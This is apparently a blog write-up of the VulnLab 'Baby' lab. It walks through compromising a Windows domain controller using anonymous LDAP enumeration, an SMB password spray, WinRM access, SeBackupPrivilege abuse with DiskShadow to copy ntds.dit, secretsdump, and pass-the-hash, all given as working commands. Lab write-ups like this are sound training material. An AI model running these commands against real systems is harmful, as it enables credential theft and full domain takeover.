---
layout: post
title: VulnLab - Baby
date: 15-04-2025
categories: [Machines/VulnLab/Windows]
tags: [ldap, anonymous, SeBackupPrivilege, smbpasswd]
image: "https://images-ext-1.discordapp.net/external/iTsNgpEcu1U88J1FvpyBi4VwhZZRBo0W6Rd5ARdznbE/https/assets.vulnlab.com/baby_slide.png?format=webp&quality=lossless"
---

## Intoduction

In this write-up, I’ll walk you through the Active Directory lab "Baby" from Vulnlab, a solo Windows machine designed for junior-level users exploring Active Directory exploitation. The lab focuses on two fundamental techniques: LDAP enumeration, which involves querying the domain for information about users, groups, and other AD objects, and Windows privilege escalation through the abuse of SeBackupPrivilege, a misconfigured right that can be leveraged to gain SYSTEM-level access. 

## Active Directory Overview
**Active Directory**

> Active Directory (AD) is a directory service by Microsoft that stores information about objects on the network, including users, groups, and computers.To identify Active Directory (AD) on a network using Nmap, you can scan for common AD-related ports such as LDAP (Port 389), LDAPS (Port 636), Kerberos (Port 88), SMB (Port 445), and DNS (Port 53). Running a command like nmap -p 389,636,88,445,53 --script=default,smb-os-fingerprint <target_ip_range>
{: .prompt-tip }

**Tools Breakdown**

> NetExec(nxc): network execution tool for interacting with various services remotely, supporting protocols like VNC, SSH, WINRM, MSSQL, FTP, LDAP, RDP, WMI, NFS, SMB. It allows for remote code execution and service interaction using valid credentials across different network protocols.

> BloodHound: A tool for Active Directory enumeration that maps out attack paths and privilege escalation opportunities in AD environments.
{: .prompt-tip }

> Evil-WinRM: A tool to remotely access Windows machines via WinRM using valid credentials for shell access.
{: .prompt-tip }

{: .prompt-tip }

## Scanning

```bash
➜  Baby nmap -Pn -T4 -sC -sV -p- 10.10.116.106 -oN reports/all_tcp.txt
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-04-13 03:14 EAT
Nmap scan report for 10.10.116.106 (10.10.116.106)
Host is up (0.19s latency).
Not shown: 65514 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-04-13 00:24:14Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: baby.vl0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: baby.vl0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2025-04-13T00:25:46+00:00; +4s from scanner time.
| ssl-cert: Subject: commonName=BabyDC.baby.vl
| Not valid before: 2025-04-11T23:48:27
|_Not valid after:  2025-10-11T23:48:27
| rdp-ntlm-info: 
|   Target_Name: BABY
|   NetBIOS_Domain_Name: BABY
|   NetBIOS_Computer_Name: BABYDC
|   DNS_Domain_Name: baby.vl
|   DNS_Computer_Name: BabyDC.baby.vl
|   DNS_Tree_Name: baby.vl
|   Product_Version: 10.0.20348
|_  System_Time: 2025-04-13T00:25:06+00:00
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49674/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49675/tcp open  msrpc         Microsoft Windows RPC
60933/tcp open  msrpc         Microsoft Windows RPC
60948/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: BABYDC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 3s, deviation: 0s, median: 3s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2025-04-13T00:25:07
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 670.17 seconds

```

## Enumeration

### LDAP
After identifying that port 389 (LDAP) is open during initial scanning, I proceeded to enumerate the LDAP service. I started by checking for anonymous access, which was enabled and allowed me to retrieve useful domain information.

**Anonymous Access**

```bash
ldapsearch -x -H ldap://10.10.116.106 -b "DC=baby,DC=vl"
```

**Users**

```bash
ldapsearch -x -H ldap://10.10.116.106 -b "DC=baby,DC=vl" -D 'baby.vl' 'objectClass=user' | grep "sAMAccountName:" | cut -d' ' -f2 | tee loots/users.txt
```
![alt text](/assets/screenshots/baby/1.png)

**Descriptions**

While exploring LDAP further, I queried the description attribute for all user objects to check if any sensitive information was stored there. It’s not uncommon for misconfigured environments to contain passwords or hints in user descriptions.

```bash
ldapsearch -x -H ldap://10.10.116.106 -b "DC=baby,DC=vl" -D 'baby.vl' 'objectClass=user' | grep "description:"
```
![alt text](/assets/screenshots/baby/2.png)

### SMB

**SMB Password Spray**

With the list of users gathered from LDAP and a password (`BabyStart123!`), I attempted a password spray attack using `nxc (nextExec)` over `SMB` to see if the credentials worked for any of the accounts. This approach tests one password across multiple usernames to `avoid account lockouts`.
The spray resulted in a successful hit, but the response indicated `STATUS_PASSWORD_MUST_CHANGE`.This means the account is valid and the credentials are correct, but the user is forced to change the password on first login, a common situation for service accounts or newly created users.

```bash
nxc smb 10.10.116.106 -u loots/users.txt -p 'BabyStart123!' --continue-on-success
```
![alt text](/assets/screenshots/baby/3.png)

Password Change
Proceeded to change the password using the smbpasswd utility.I authenticated with the current password and was prompted to set a new one. After successfully changing it to `NewSecurePass123!`, I re-tested access using `nxc`

```bash
smbpasswd -r 10.10.116.106 -U Caroline.Robinson
```

![alt text](/assets/screenshots/baby/4.png)

![alt text](/assets/screenshots/baby/5.png)

This time, the login worked without issues. With valid credentials and no password change required, I now had authenticated access to the system as Caroline.Robinson, ready to enumerate further 

```bash
nxc smb 10.10.116.106 -u Caroline.Robinson -p 'NewSecurePass123!' --users
```

![alt text](/assets/screenshots/baby/6.png)



## Initial Access

With the credentials for Caroline.Robinson confirmed and no further password restrictions, I attempted to gain a shell on the target using WinRM (Windows Remote Management). First, I tested connectivity using nxc to confirm WinRM was accessible with the current credentials:

```bash
nxc winrm 10.10.116.106 -u Caroline.Robinson -p 'NewSecurePass123!'
```

```bash
evil-winrm -i 10.10.116.106 -u Caroline.Robinson -p 'NewSecurePass123!'
```

![alt text](/assets/screenshots/baby/10.png)



## PrivEsc

### Bloodhound

To identify potential privilege escalation paths, I used BloodHound via the bloodhound-python collector while authenticated as Caroline.Robinson. This tool is extremely useful in Active Directory environments to visualize relationships, permissions, and privilege chains.

```bash
bloodhound-python -d baby.vl  -c all -u 'Caroline.Robinson' -p 'NewSecurePass123!'  -ns 10.10.116.106 --zip
```

![alt text](/assets/screenshots/baby/7.png)

**First Degree Group Membership**

I noticed that the user Caroline.Robinson was a first-degree group member of Backup Operators, a built-in Windows group with special privileges. To confirm this manually, I checked the user privileges directly from the shell.The output confirmed that the user indeed had the SeBackupPrivilege assigned — a powerful privilege that can be abused to read arbitrary files, including the registry or even the NTDS.dit file, by backing them up and extracting sensitive data like hashes.


![alt text](/assets/screenshots/baby/8.png)

![alt text](/assets/screenshots/baby/9.png)


![alt text](/assets/screenshots/baby/11.png)

**Abusing SeBackupPrivilege**

With SeBackupPrivilege confirmed, I proceeded to abuse it using DiskShadow to create a Volume Shadow Copy and extract sensitive files like `ntds.dit` (which contains password hashes) and the `SYSTEM` registry hive (needed to decrypt the hashes).

I created a vss.dsh script with the following content:

```bash
set context persistent nowriters
set metadata c:\programdata\cyb4x.cab
set verbose on
add volume c: alias cyb4x
create
expose %cyb4x% z:
```

![alt text](/assets/screenshots/baby/12.png)

```bash
diskshadow /s vss.dsh
```

![alt text](/assets/screenshots/baby/13.png)

**Volume Shadow Copy**

This successfully mounted the shadow copy to the Z: drive. I was then able to copy the sensitive files using robocopy and reg.exe:

```bash
robocopy /b z:\windows\ntds . ntds.dit
```

![alt text](/assets/screenshots/baby/14.png)

also

```bash
reg.exe save hklm\system system
```

**Transferring Files**

Once both the `ntds.dit` and `system` hive files were obtained, I used `evil-winrm` `upload/download` functionality to exfiltrate them for offline secrets dumping:

![alt text](/assets/screenshots/baby/15.png)

**Dumping Secrets**

With both the `ntds.dit` and `system` hive files successfully extracted, I used `Impacket secretsdump`.py to extract hashes.

```bash
secretsdump.py -system system -ntds ntds.dit local
```

![alt text](/assets/screenshots/baby/16.png)

**Pass-the-Hash(PtH)**

Instead of cracking the hash, I performed a `Pass-the-Hash (PtH)` attack using `evil-winrm`, which allows authentication directly with the `NTLM` hash:

```bash
evil-winrm -i 10.10.89.186 -u Administrator -H ee4457ae59f1e3fbd764e33d9cef123d
```

![alt text](/assets/screenshots/baby/17.png)

## References

[NetExec Cheatsheet](https://seriotonctf.github.io/2024/03/07/CrackMapExec-and-NetExec-Cheat-Sheet/)

[Windows Privilege Escalation: SeBackupPrivilege](https://www.hackingarticles.in/windows-privilege-escalation-sebackupprivilege/)

